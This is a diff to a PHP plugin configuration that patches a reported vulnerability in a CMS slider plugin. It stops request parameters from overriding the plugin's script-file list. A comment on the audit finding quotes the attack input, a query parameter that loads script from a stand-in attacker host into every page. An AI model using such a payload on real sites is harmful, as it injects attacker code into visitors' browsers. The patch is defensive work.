@@ -10,6 +10,13 @@ return array(
             'plugins' => array(
                 'MelisCmsSliderShowSliderPlugin' => array(
                     'front' => array(
+                        // SECURITY (audit SL-H1): keys listed here are excluded from the
+                        // GET/POST→config merge of MelisTemplatingPlugin::updateFrontConfig —
+                        // without it, ?files-js-0=//evil/x.js (or the POST equivalent, which
+                        // the front XSS listener does not sanitize at all) injected an
+                        // attacker-controlled <script src> into every page carrying this
+                        // plugin (reproduced live on the demo site).
+                        'sub_plugins_params' => array('files'),
                         'template_path' => array('MelisCmsSlider/showslider'),
                         'id' => 'showslider',
                         'sliderId' => 1,
